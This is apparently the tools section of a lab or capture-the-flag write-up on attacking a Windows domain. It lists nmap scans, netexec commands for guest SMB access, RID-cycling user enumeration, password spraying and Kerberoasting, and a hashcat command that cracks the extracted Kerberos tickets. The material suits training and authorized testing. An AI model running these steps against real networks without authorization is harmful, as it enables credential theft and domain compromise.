## Tools Used

---

#### hashcat


```
hashcat -m 13100 khash.txt /usr/share/wordlists/rockyou.txt
```

> -m, --hash-type=NUM
>> HSpecifies the hash algorithm by its ID number.

---

#### nmap



```
nmap $TARGET
```

```
nmap -p- $TARGET -Pn
```

```
nmap -sVC -p 53,88,135,139,189,445,464,593,636,3268,3269,3389,5985,9389,5985,9389,49664,49667,49673,49113,49804 $TARGET -Pn
```


>-p (port_range)
>> Defines which ports to scan. Accepts single ports, comma‑separated lists, ranges (e.g., 1–1024), or -p- for all ports.

> -Pn: Treats every host as reachable by skipping the host‑discovery phase.

>-sC: Runs the default script set (same as --script=default).

>-sV: Examines open ports to identify the service and version running on them.

---

#### netexec


```
nxc smb <Domain Name> -u guest -p ''
```

```
nxc smb <Domain Name> -u guest -p '' --shares
```

```
nxc smb <Domain Name> -u guest -p '' --rid >> nxc-cmd.txt
```

```
nxc smb $TARGET -u usernames.txt -p usernames.txt --no-bruteforce | grep -v FAILIURE
```

```
nxc ldap $TARGET -u <username> -p <password> --kerberoasting khash.txt
```

`netexec protocol target [-u user] [-p pass] [-H hash] [options]`

>--shares
>> Lists available SMB shares on the target.

> --kerberoasting 
>> Extracts Kerberos service tickets for accounts with SPNs.

> --no-bruteforce
>> Disables password brute‑forcing.

> --rid
>> Enumerates domain users and groups by cycling through Relative Identifiers (RIDs).

---


